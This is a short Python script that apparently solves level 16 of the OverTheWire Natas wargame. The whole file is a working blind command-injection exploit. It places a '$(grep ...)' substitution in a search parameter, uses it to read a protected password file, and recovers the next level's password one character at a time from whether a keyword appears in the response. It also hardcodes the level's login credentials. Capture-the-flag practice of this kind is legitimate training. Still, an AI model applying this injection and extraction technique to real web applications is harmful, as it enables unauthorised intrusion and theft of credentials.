#!/bin/python3
import string
import requests

# page login creds
user = "natas16"
passwd = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
url = "http://natas16.natas.labs.overthewire.org?needle={0}african"

# search on page
keyword = "Africans"

# password stuffs
charset = [ch for ch in (string.ascii_lowercase + string.ascii_uppercase  + string.digits)]

new_password = ""
found = False
while True:
    for char in charset:
        grep = "$(grep -E ^{0}{1} /etc/natas_webpass/natas17)".format(new_password, char)
        response = requests.get(url.format(grep), auth=(user, passwd))

        if keyword not in response.text:
            found = True
            new_password = ''.join([new_password, char])
            print("Character found: " + new_password)
            break

    if not found:
        break

print("Final password:" + new_password)
        



